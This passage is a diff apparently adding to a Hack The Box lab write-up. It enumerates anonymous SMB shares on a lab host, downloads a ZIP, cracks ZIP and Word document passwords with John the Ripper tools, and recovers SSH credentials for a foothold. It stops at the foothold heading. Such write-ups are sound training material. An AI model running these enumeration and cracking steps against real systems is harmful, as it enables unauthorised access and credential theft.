@@ -39,3 +39,54 @@ Host script results:
 |_  start_date: N/A
 ```  
 
+### SMB  
+
+>Enumerate if any shares allow anonymous or null unauthenticated read of data and files.
+
+```
+smbmap -u '' -H 10.129.202.221
+```  
+
+>Discovering a share `SHAREDRIVE` that allow read access anonymously.  
+
+```
+smbclient -N \\\\10.129.202.221\\SHAREDRIVE
+
+get Docs.zip
+```
+
+>Extract the ZIP password hash, and then Crack password protected zip file using `John`.  
+
+```
+zip2john Docs.zip >docs.hash
+
+john docs.hash --wordlist=resources/demo-pass.lst
+```  
+
+>Cracking the Office Document DOCX file password with `office2john`. [Cracking Documents](https://academy.hackthebox.com/module/147/section/1322)  
+
+```
+office2john Documentation.docx >office.hash
+
+john office.hash --show
+```
+
+>Office DOCX file password cracked as `987654321`, and discover the Microsoft Word Document content as below.  
+
+![office2john-Password-Attacks-Lab-Medium](/images/office2john-Password-Attacks-Lab-Medium.png)  
+
+>Discovered password information from word document, as below:  
+
+```
+
+Root password is jason:C4mNKjAtL2dydsYa6
+>10.129.200.21</inlane.configure.localIp>
+
+http://localhost:8080/cms 
+```  
+
+## Foothold
+
+>Gain access to target as `jason` via ssh with the password `C4mNKjAtL2dydsYa6`.  
+
+
